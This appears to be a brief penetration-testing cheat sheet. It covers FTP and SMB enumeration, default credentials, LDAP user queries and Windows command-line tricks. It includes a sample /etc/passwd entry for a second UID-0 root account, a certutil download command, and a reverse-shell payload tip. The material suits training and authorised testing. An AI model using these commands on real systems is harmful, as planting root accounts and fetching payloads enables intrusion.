1. Enumeration
  nmap port scan
  Common ports
  FTP
    Anonymous Login?
    Common Credentials? admin/admin
    
    
   smbclient get all files:
   recurse (toggles recursive mode)
   prompt (toggles Y/N requests)
   mget *
  
  Creating password hashes for /etc/passwd  or /etc/shadow
  
  ```
  openssl passwd -6 -salt xyz  yourpass
  -1 MD5
  -5 SHA256
  -6 SHA512
  ```  
  Sample root2:testing user for /etc/passwd
  ```
  root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
  ```


## Command Line 
### Linux  

### Windows  
"Grep" function in Windows  
`findstr /I "<string>"` 

Query LDAP for users
`ldapsearch -H ldap://[IP]:[Port] -x -LLL -s sub -b "dc=<dcname>,dc=<dcname>"`

Downloading from Windows Command line  
`certutil.exe -urlcache -f http://target/remotefile localfile`

### Notes  

- when generating a shell on windows, use windows/shell_reverse_tcp
